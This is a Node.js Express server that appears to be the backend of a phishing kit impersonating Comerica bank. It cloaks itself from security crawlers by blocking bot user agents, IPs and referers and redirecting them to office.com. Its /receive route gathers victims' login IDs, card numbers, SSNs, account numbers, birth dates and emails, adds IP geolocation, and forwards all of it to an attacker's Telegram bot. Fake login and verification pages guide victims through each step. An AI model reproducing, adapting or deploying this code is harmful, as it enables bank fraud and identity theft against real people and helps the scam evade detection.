const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs').promises;
const axios = require('axios');
const MobileDetect = require('mobile-detect');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botToken, chatId, redirect_url } = require('./config/settings.js');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { sendMessageFor } = require('simple-telegram-message');
const { botBlock } = require('./config/botBlocker');
const viewDir = path.join(__dirname, 'views');

// Blocked IPs, OS, Browsers and Unsupported OS/Browsers
const blockedIps = ["92.23.57.168", "96.31.1.4", "207.96.148.8"];
const blockedOS = ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"];
const blockedBrowsers = ["Internet Explorer", "Firefox", "Chrome"];
const unsupportedOSBrowsers = [
  { os: "Windows Server 2003/XP x64", browser: "Firefox" },
  { os: "Windows 7", browser: "Firefox" },
  { os: "Windows XP", browser: "Firefox" },
  { os: "Windows XP", browser: "Internet Explorer" },
  { os: "Windows Vista", browser: "Internet Explorer" },
  { os: "Windows 2000", browser: "Unknown Browser" },
  { os: "Unknown OS Platform", browser: "Unknown Browser" },
];

const redirectUrl = "https://office.com"; // Redirection link

// Middleware for IP and bot detection
function getClientIp(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  return xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.connection.remoteAddress || req.socket.remoteAddress;
}

function isBotUA(userAgent) {
  if (!userAgent) return false;
  return isbot(userAgent) || botUAList.some(bot => userAgent.toLowerCase().includes(bot));
}

function isBotIP(ipAddress) {
  if (!ipAddress) return false;
  ipAddress = ipAddress.substr(0, 7) === '::ffff:' ? ipAddress.substr(7) : ipAddress;

  const IPtoNum = ip => ip.split('.').map(d => ('000' + d).substr(-3)).join('');
  return (
    botIPList.some(botIP => ipAddress.includes(botIP)) ||
    botIPRangeList.some(([min, max]) => IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)) ||
    botIPCIDRRangeList.some(cidr => ipRangeCheck(ipAddress, cidr)) ||
    botIPWildcardRangeList.some(pattern => ipAddress.match(pattern) !== null)
  );
}

function isBotRef(referer) {
  return botRefList.some(ref => referer && referer.toLowerCase().includes(ref));
}

// Combined Bot detection middleware
const detectBotMiddleware = (req, res, next) => {
  const ip = req.ip || getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';
  const referer = req.headers.referer || req.headers.origin;
  const os = req.headers['x-os'] || 'Unknown OS';  // You may need a method to detect OS
  const browser = req.headers['x-browser'] || 'Unknown Browser'; // You may need a method to detect browser

  const isBlockedIP = blockedIps.includes(ip);
  const isBlockedOS = blockedOS.includes(os);
  const isBlockedBrowser = blockedBrowsers.includes(browser);
  const isUnsupportedOSBrowser = unsupportedOSBrowsers.some(
    (pair) => pair.os === os && pair.browser === browser
  );

  if (
    isBlockedIP ||
    isBlockedOS ||
    isBlockedBrowser ||
    isUnsupportedOSBrowser ||
    botBlock.some(bot => userAgent.toLowerCase().includes(bot)) ||
    isBotUA(userAgent) ||
    isBotIP(ip) ||
    isBotRef(referer)
  ) {
    console.log(`Blocked by OS/Browser: IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
    return res.redirect(redirectUrl);
  }

  next();
};

// Apply Bot Detection Middleware
app.use(detectBotMiddleware);

// Body parser and static file serving
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));

// API request for geo-location
async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
  return response.data;
}

// Route for form submission
app.post('/receive', async (req, res) => {
  let message = '';
  const myObject = req.body;

  try {
    const ipAddress = getClientIp(req);
    const geoInfo = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    
    const myObjectKeys = Object.keys(myObject).map(key => key.toLowerCase());
    const fullGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\nCity: ${geoInfo.location.city}\nState: ${geoInfo.location.principalSubdivision}\nZIP: ${geoInfo.location.postcode}\nCountry: ${geoInfo.country.name}\nTime: ${geoInfo.location.timeZone.localTime}\nISP: ${geoInfo.network.organisation}\n\n`;
    const basicGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\n\n`;

    const prepareMessage = (header, type, includeFullGeo = false) => {
      message += `👤 ${header}\n========================\n`;
      Object.keys(myObject).forEach(key => {
        if (key.toLowerCase() !== 'visitor' && myObject[key]) {
          message += `${key.toUpperCase()}: ${myObject[key]}\n`;
        }
      });
      message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM | COMERICA\n💬 Telegram: https://t.me/updteams\n`;

      res.send({ url: type });
    };

    if (myObjectKeys.includes('userid')) {
      prepareMessage("LOGIN", "/verify?action=1", true);
    } else if (myObjectKeys.includes('city') || myObjectKeys.includes('zipcode') || myObjectKeys.includes('cardnumber')) {
      prepareMessage("BILLING INFO", redirect_url, false);
    } else if (myObjectKeys.includes('ssn') || myObjectKeys.includes('accountnumber') || myObjectKeys.includes('email')) {
      prepareMessage("ACCOUNT INFO", "/verify?action=3", false);
    } else if (myObjectKeys.includes('dob')) {
      prepareMessage("ACCOUNT INFO", "/verify?action=2", false);
    } else {
      res.status(400).send({ error: "No matching keys found in request body." });
    }

    const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
    console.log(message);

  } catch (error) {
    res.status(500).send({ error: "Internal server error" });
    console.error(error);
  }
});

// Route for login
app.get('/login', async (req, res) => {
  try {
    const htmlContent = await fs.readFile(path.join(viewDir, 'Index.html'), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route for verify page
app.get('/verify', (req, res) => { 
  const action = req.query.action;
  const verifyPages = {
    '1': 'enroll.html',
    '2': 'acc.html',
    '3': 'card.html'
  };

  const page = verifyPages[action] || 'login';
  res.sendFile(path.join(viewDir, page));
}); 

// Default route
app.get('/', (req, res) => res.redirect('/login'));